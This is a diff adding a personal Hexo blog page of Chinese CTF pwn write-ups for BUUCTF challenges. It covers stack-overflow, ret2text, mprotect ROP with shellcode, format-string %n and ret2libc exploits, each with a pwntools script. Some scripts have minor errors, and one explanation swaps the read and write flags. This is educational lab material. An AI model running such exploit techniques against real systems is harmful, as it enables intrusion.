@@ -1,0 +1,298 @@
+
+
+  <!DOCTYPE html>
+  <html lang="en">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="renderer" content="webkit">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="description" content=嘿，我是jesse～这是我的子站，用于展示Hexo主题：MiHoYo。欢迎访问！ >
+  <meta name="keywords" content=hexo,theme,MiHoYo >
+
+  <head>
+    <title>
+       [ Hexo ]
+    </title>
+  <meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+
+    <link rel="stylesheet" href="/css/header.css">
+<div class="header">
+  <div class="logo">
+    <span class="pull-left">
+      <a id="site-name" href="/">
+        jesse&#39;s blog
+      </a>
+    </span>
+  </div>
+  <ul class="nav-list">
+    
+      <li>
+        <a href="/">
+          首页
+        </a>
+      </li>
+      
+      <li>
+        <a href="/about">
+          关于
+        </a>
+      </li>
+      
+  </ul>
+</div>
+
+      <!--<link rel="stylesheet" href="/css/top-header.css">
+<div id="top-bar" class="fixed">
+
+  <a class="goto-top" href="#"></a>
+  <ul class="bar-list bar-list-1">
+    
+      <li>
+        <p>
+          <a href="/">
+            <text class="bar-text bar-p1">
+              首页
+            </text>
+            <text class="bar-text bar-p2"></text>
+          </a>
+          <text class="bar-p3">/</text>
+        </p>
+      </li>
+      
+      <li>
+        <p>
+          <a href="/about">
+            <text class="bar-text bar-p1">
+              关于
+            </text>
+            <text class="bar-text bar-p2"></text>
+          </a>
+          <text class="bar-p3">/</text>
+        </p>
+      </li>
+      
+  </ul>
+</div>-->
+
+        <div id="content-outer">
+          <div class="content-inner">
+            <link rel="stylesheet" href="/css/post.css">
+<div class="posts">
+  <a href="/index.html"><i class="fa fa-home
+replay-btn" aria-hidden="true"></i></a>
+  <div class="post-title">
+    <p>
+      
+    </p>
+    <hr>
+  </div>
+  <div class="post-content">
+    <h1 id="PWN例题"><a href="#PWN例题" class="headerlink" title="PWN例题"></a>PWN例题</h1><h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><h3 id="1-get-started-3dsctf-2016"><a href="#1-get-started-3dsctf-2016" class="headerlink" title="1.get_started_3dsctf_2016"></a>1.get_started_3dsctf_2016</h3><p><strong>wp</strong></p>
+<p>查看保护情况</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 160841.png)</p>
+<p>ida分析</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 162745.png)</p>
+<p>发现get_flag函数</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 163036.png)</p>
+<h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><p>思路很简单，就是通过gets函数溢出执行get_flag函数，并且使得a1,a2的值满足if语句</p>
+<p>tips：最后必须要返回exit，因为本题没有开启标准输入输出，输入输出会在缓冲区呆着，而exit执行后会将缓冲区输出，则可回显flag！！！</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 164451.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 165602.png)</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26414</span>)</span><br><span class="line">addr=<span class="number">0x080489A0</span> <span class="comment">#getflag地址</span></span><br><span class="line">offset = <span class="number">56</span> <span class="comment">#偏移0x38</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset+p32(addr)+p32(<span class="number">0x0804E6A0</span>)+p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> mprotect(const void *start, size_t <span class="built_in">len</span>, <span class="built_in">int</span> prot);</span><br><span class="line"><span class="comment">#第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="comment">#第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="comment">#第三个参数的是要赋予的权限。</span></span><br></pre></td></tr></table></figure>
+
+<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。<br>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：<br>　　1）PROT_READ：表示内存段内的内容可写；<br>　　2）PROT_WRITE：表示内存段内的内容可读；<br>　　3）PROT_EXEC：表示内存段中的内容可执行；<br>　　4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
+<p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。<strong>区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</strong><br>就这样，我们就可以将一段地址弄成可以执行的了。因为程序本身也是静态编译，所以地址是不会变的。</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 165916.png)</p>
+<p>ctrl+s可以调出程序的段表</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 165951.png)</p>
+<p>由于要求的地址空间为4K的整数倍，因此后三位为000，即bss_addr &#x3D; 0x80eb000</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,26414)</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = <span class="number">0x806ec80</span></span><br><span class="line">read_addr = <span class="number">0x806e140</span></span><br><span class="line">bss_addr = <span class="number">0x80eb000</span></span><br><span class="line">pop3_ret = <span class="number">0x8063adb</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(mprotect_addr)+p32(pop3_ret)+p32(bss_addr)+p32(<span class="number">0x1000</span>)+p32(<span class="number">0x7</span>)+p32(read_addr)+p32(pop3_ret)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">0x100</span>)+p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里pop3_ret目的是栈平衡，由于mprotect和read都是3个参数，选用三个参数的pop进行栈平衡</p>
+<p><strong>思路</strong></p>
+<p>首先利用了mprotect函数修改内存权限，然后利用read读取shellcode到该内存区域。</p>
+<p>整体是利用了ROP链的思想，由于开启了NX保护，所以不断利用retn返回地址来达到调用函数，注入shellcode的目的。   </p>
+<p>mprotect第一个参数为需要修改的内存起始地址，这个地址也就是我们接下来shellcode将要写入的地方；第二个参数为修改的内存大小，一般取内存的整数页；第三个参数为0x7，表示该内存拥有可读可写可执行权限。</p>
+<p>read函数第一个参数是打开的文件描述符，0表示输入；第二参数指明读取的数据存放的内存起始位置；第三个参数指明最大读取的字节数。  </p>
+<p>而每次调用函数后都是返回到pop_3_ret中执行，是用该段汇编代码弹出压入栈中的三个参数来达到栈平衡。该代码的地址不唯一，在程序中找到相应弹出三个栈的操作再加ret的汇编代码就行。</p>
+<h3 id="2-warmup-csaw-2016"><a href="#2-warmup-csaw-2016" class="headerlink" title="2.warmup_csaw_2016"></a>2.warmup_csaw_2016</h3><p>查看保护情况</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 094100.png)</p>
+<p>ida分析，shift+F12查看字符串，发现敏感字符串，进入sub_40060D</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 094248.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 094234.png)</p>
+<p>双击函数，先TAB，再空格，找到cat flag.txt地址，即后门函数地址</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 094523.png)</p>
+<p>进入main函数，发现栈溢出</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 094720.png)</p>
+<p>查看变量v5与返回地址间的偏移，0x40+8</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 094700.png)</p>
+<p>思路：通过栈溢出至cat flag处，使程序执行cat flag，即可获得shell</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node5.buuoj.cn&#x27;, 25899)</span></span><br><span class="line">p = process(<span class="string">&#x27;./retlibc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>)+p64(<span class="number">0x400611</span>）</span><br><span class="line">                          </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-jarvisoj-level0"><a href="#3-jarvisoj-level0" class="headerlink" title="3.jarvisoj_level0"></a>3.jarvisoj_level0</h3><p>查看保护</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 095404.png)</p>
+<p>ida分析，进入main函数，跟进发现栈溢出</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 095221.png)</p>
+<p>双击buf变量，得到与返回地址的偏移，0x80+8</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 095240.png)</p>
+<p>shift+F12查看敏感字符串，进入，交叉引用，发现后门函数</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 095312.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 095302.png)</p>
+<p>&#x2F;bin&#x2F;sh字符串地址，即程序返回地址，0x40059A</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 100006.png)</p>
+<p>思路：使程序栈溢出至&#x2F;bin&#x2F;sh处，覆盖返回地址为后门地址即可</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29444</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x80</span>+<span class="number">8</span></span><br><span class="line">bin_sh_addr = <span class="number">0x40059A</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*offset + p64(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-第五空间2019-决赛-PWN5（格式化字符串）"><a href="#4-第五空间2019-决赛-PWN5（格式化字符串）" class="headerlink" title="4.[第五空间2019 决赛]PWN5（格式化字符串）"></a>4.[第五空间2019 决赛]PWN5（格式化字符串）</h3><p>开启栈溢出和NX保护，32位，动态链接</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 101225.png)</p>
+<p>ida分析，查看字符串，进入&#x2F;bin&#x2F;sh字符串的交叉引用，发现<strong>格式化字符串漏洞。</strong></p>
+<p>函数的功能是读入一个4位的随机密码，再将我们输入的密码与随机生成数比较，相同就执行system</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 101724.png)</p>
+<p><strong>思路：</strong></p>
+<p>1.利用 “AAAA %x %x %x %x %x %x %x………… “,这样的字符串来找到我们输入的参数在函数栈上的位置，我看别的师傅叫首地址偏移或者偏移量</p>
+<p>2.假设是在栈上第n位，那么可以利用 %n$ 定位到参数在栈上的位置</p>
+<p>3.利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据不就好了</p>
+<p>首先我们要定位到我们输入的字符串在栈上的位置</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 102829.png)</p>
+<p>我们输入的参数在在栈上第10个，利用%10$n定位到这个位置</p>
+<p>随机生成函数的位置是0x804c044开始的，长度为4字节,依次+1即可。</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 103133.png)</p>
+<p>所以可以用<code>%10$,%11$,%12$,%13$</code>去定位到这4个地址，再用%n修改这这个地址里的内容，因此构造payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload+=<span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意passwd的每个字节是<code>p32(0x804c047)+p32(0x804c046)+p32(0x804c045)+p32(0x804c044)</code>的长度，也就是4x4&#x3D;16，二进制为0x10，所以passwd就是4个0x10拼接起来后的计算结果str(0x10101010)&#x3D;269488144</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))  <span class="comment">#AAAA的二进制表示</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27371</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-not-the-same-3dsctf-2016"><a href="#5-not-the-same-3dsctf-2016" class="headerlink" title="5.not_the_same_3dsctf_2016"></a>5.not_the_same_3dsctf_2016</h3><h3 id="6-jarvisoj-level2"><a href="#6-jarvisoj-level2" class="headerlink" title="6.jarvisoj_level2"></a>6.jarvisoj_level2</h3><p>查看保护情况</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 170110.png)</p>
+<p>ida分析，发现栈溢出</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 170316.png)</p>
+<p>查看字符串，双击跟进，ctrl+x交叉引用，发现程序中无调用该字符串的函数</p>
+<p>&#x2F;bin&#x2F;sh字符串地址，即shell_addr&#x3D;0x0804A024</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 170634.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 170834.png)</p>
+<p>计算buf变量与返回地址距离，0x88+4</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 171035.png)</p>
+<p>system函数地址，0x08048320</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-25 171241.png)</p>
+<p>直接利用这些构造payload去执行</p>
+<p>32位不用pop的gadget，32位的分布是这样子的，返回地址+下一次的返回地址+参数1+参数2+…<br>这样子因为我们下一次返回地址是啥都行，我们拿到shell就跑了，所以直接为0</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28122</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x0804A024</span></span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-ciscn-2019-n-8"><a href="#7-ciscn-2019-n-8" class="headerlink" title="7*.ciscn_2019_n_8"></a>7*.ciscn_2019_n_8</h3><p>查看保护情况，这么多保护，赶紧ida分析一下，32位</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 095128.png)</p>
+<p>ida分析，发现格式化字符串，&#x2F;bin&#x2F;sh字符串地址，0x1336及system地址,0x133D</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 101120.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 100054.png)</p>
+<p>但本题重点不在这，而在让var[13]&#x3D;&#x3D;17即可</p>
+<p>错误的exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29772</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>思路：构造payload，使var前13位由任意字符填充，再让var[13]&#x3D;&#x3D;17，即可顺利执行system，但注意，qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以<strong>它自然是word（2字节，0~2^16-1）的四倍，8字节</strong></p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26819</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)+p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26819</span>)</span><br><span class="line">payload=p32(<span class="number">17</span>)*<span class="number">14</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-bjdctf-2020-babystack"><a href="#8-bjdctf-2020-babystack" class="headerlink" title="8*.bjdctf_2020_babystack"></a>8*.bjdctf_2020_babystack</h3><p>查看保护</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 105906.png)</p>
+<p>ida分析，发现后门函数</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 111342.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 105659.png)</p>
+<p>变量buf输入点与返回地址的距离，0x10+8![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 110023.png)</p>
+<p>&#x2F;bin&#x2F;sh地址，0x4006EA</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 111555.png)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27789</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x4006EA</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input the length of your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;50&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;]What&#x27;s u name?\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-ciscn-2019-c-1（ret2libc）"><a href="#9-ciscn-2019-c-1（ret2libc）" class="headerlink" title="9*.ciscn_2019_c_1（ret2libc）"></a>9*.ciscn_2019_c_1（ret2libc）</h3><p>查看保护情况</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 113000.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 114009.png)</p>
+<p>ida分析，没有发现system函数和字符串“bin&#x2F;sh”，先根据输入点的字符串查看一下主要函数</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 113858.png)</p>
+<p>就像一开始说的程序的功能就是加密和解密，看伪代码可以知道，只有选1的时候才会调用encrypt（）这个应该是加密函数，其余选项没有利用点</p>
+<p>看一下encrypt代码</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 113915.png)</p>
+<p>从11行到33行是我们的加密函数的加密过程部分，它会对我们输入的字符串进行操作，为了保证我们构造的rop不会被破坏，要想办法绕过加密，14行的if判断里有个strlen函数，strlen的作用是得知字符串的长度，但是遇到’\0‘就会停止，所以我们在构造rop的时候可以在字符串前加上’\0‘来绕过加密</p>
+<p>变量s的偏移，0x50+8</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 114906.png)</p>
+<p>main函数地址</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 125706.png)</p>
+<p>exit地址，0x4006B9，查看字符串，双击跟进，tab键，发现退出函数</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 125820.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 125917.png)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 130018.png)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26605</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400B28</span></span><br><span class="line">exit_addr = <span class="number">0x4006B9</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;encrypted\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)     <span class="comment">#找到libc版本</span></span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)     <span class="comment">#算出偏移量</span></span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)   <span class="comment">#偏移量+libc函数地址=实际函数地址</span></span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(exit_addr)+p64(rdi_addr)+p64(binsh)+p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;encrypted\n&quot;</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行后，选择1系统会让你重新选择一次，并且到最后无法得到flag，所以直接选择0，flag这不就来了嘛，(#^.^#)</p>
+<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-26 131453.png)</p>
+<h3 id="10-jarvisoj-level2-x64"><a href="#10-jarvisoj-level2-x64" class="headerlink" title="10.jarvisoj_level2_x64"></a>10.jarvisoj_level2_x64</h3><p>查看保护情况</p>
